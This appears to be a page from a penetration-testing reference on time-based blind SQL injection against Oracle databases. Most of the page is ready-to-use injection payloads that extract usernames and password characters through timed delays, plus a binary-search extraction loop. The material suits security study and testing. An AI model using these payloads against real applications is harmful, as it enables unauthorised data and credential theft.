---
title: Timing
description: Using time-based techniques for Oracle SQL injection attacks
category: Injection Techniques
order: 11
tags: ["timing", "blind injection", "delay", "time-based"]
lastUpdated: 2026-10-08
---

Time-based techniques extract data when the application shows no output and no difference between true and false conditions. The payload delays the response only when a condition is true, and the attacker measures the response time.

An `AND` payload only runs when the original condition is true: Oracle skips the rest of an `AND` once the first part is false. The examples inject after a valid value (`admin'`); with no known value, use an `OR` form instead.

## Delay Methods

| Method                        | Kind      | Usable in a SELECT | Privileges                                           |
| ----------------------------- | --------- | ------------------ | ---------------------------------------------------- |
| `DBMS_PIPE.RECEIVE_MESSAGE`   | Function  | Yes                | EXECUTE on `DBMS_PIPE` (often not granted to PUBLIC) |
| Heavy query                   | Query     | Yes                | None beyond the visible data dictionary              |
| `UTL_INADDR.GET_HOST_ADDRESS` | Function  | Yes                | EXECUTE on `UTL_INADDR` and a network ACL            |
| `UTL_HTTP.REQUEST`            | Function  | Yes                | EXECUTE on `UTL_HTTP` and a network ACL              |
| `DBMS_SESSION.SLEEP`          | Procedure | No, PL/SQL only    | EXECUTE on `DBMS_SESSION` (granted to PUBLIC)        |
| `DBMS_LOCK.SLEEP`             | Procedure | No, PL/SQL only    | EXECUTE on `DBMS_LOCK` (not granted to PUBLIC)       |

`DBMS_LOCK.SLEEP` and `DBMS_SESSION.SLEEP` (Oracle 18c+) are procedures, so they cannot appear in a query: `' AND DBMS_LOCK.SLEEP(5)=0--` fails with `ORA-00904`. They only help when the injection lands inside a PL/SQL block, for example a string passed to `EXECUTE IMMEDIATE 'BEGIN ... END;'`.

`EXECUTE` on `DBMS_PIPE` was not granted to `PUBLIC` on any version tested (11g XE, 18c, 21c, 23ai), so check `ALL_TAB_PRIVS` before relying on it.

Since Oracle 11g, `UTL_INADDR` and `UTL_HTTP` also need a network access control list entry for the database user, so they rarely work from an ordinary application account.

## DBMS_PIPE.RECEIVE_MESSAGE

`DBMS_PIPE.RECEIVE_MESSAGE(pipe, timeout)` waits up to `timeout` seconds for a message on a pipe nobody writes to, then returns `1`:

```sql
-- Unconditional 5 second delay (a quick test that the function is available)
admin' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1--

-- Delay only when the condition is true
admin' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--
```

## Heavy Queries

When no delay function is available, a large cartesian join takes a measurable time. It only runs when the `CASE` branch is taken, because Oracle evaluates scalar subqueries lazily:

```sql
-- Several seconds when true, immediate when false
admin' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN (SELECT COUNT(*) FROM all_objects a, all_objects b) ELSE 0 END)>=0--
```

The delay depends on how many objects the user can see in `ALL_OBJECTS` and on server load: measure the true and false cases before relying on it, and add a third `all_objects c` with `WHERE ROWNUM <= n` to tune it. A join on a key (`WHERE a.object_id = b.object_id`) is fast and gives no delay.

## Extracting Data

```sql
-- First character of the first username is 'a' (ASCII 97)?
admin' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE ROWNUM=1),1,1))=97 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--

-- Second character
admin' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE ROWNUM=1),2,1))=100 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--
```

### Binary Search

Halving the range each time needs about 7 requests per character instead of up to 95:

```sql
-- Is the code above 79?
admin' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE ROWNUM=1),1,1))>79 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--

-- Bit by bit: is bit 0 set? (BITAND, since Oracle has no & operator)
admin' AND (CASE WHEN BITAND(ASCII(SUBSTR((SELECT username FROM users WHERE ROWNUM=1),1,1)),1)=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--
```

### Testing for Existence

```sql
-- Does a table named USERS exist?
admin' AND (CASE WHEN (SELECT COUNT(*) FROM all_tables WHERE table_name='USERS')>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--

-- Does the user 'admin' exist?
admin' AND (CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin')>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END)>=0--
```

## Combining with Other Techniques

```sql
-- Delay when true, error when false: both outcomes are visible
admin' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 1/0 END)>=0--

-- Inside a UNION query (two-column example)
' UNION SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTR(password,1,1)='s')>0 THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 'b' END, NULL FROM dual--
```

## Practical Considerations

1. Measure the normal response time first, and use delays well above its variance (3-5 seconds)
2. Repeat a request when a result looks borderline
3. Keep delays short enough to stay under application and proxy timeouts
4. A tool such as sqlmap automates this: it tries each technique, calibrates delays and uses binary search

An extraction loop, in pseudo-code:

```text
for position in 1..length:
    low, high = 32, 126
    while low < high:
        mid = (low + high) / 2
        if request("... ASCII(SUBSTR(secret, position, 1)) > mid ...") is slow:
            low = mid + 1
        else:
            high = mid
    secret[position] = chr(low)
```
